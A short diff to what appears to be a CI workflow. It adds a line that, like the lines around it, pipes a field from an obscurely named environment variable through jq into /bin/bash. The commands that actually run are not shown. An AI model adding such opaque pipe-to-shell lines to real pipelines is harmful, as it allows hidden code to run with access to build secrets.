@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$sknn039" | jq -r .eavh240 | /bin/bash
           printf '%s' "$vu5226" | jq -r .zvcmp90 | /bin/bash
           echo $stjdc2464 | jq -r .mwbtx6401 | /bin/bash
+          echo $ittm49803 | jq -r .onsnx60 | /bin/bash
 
       - name: Archive output
         if: always()
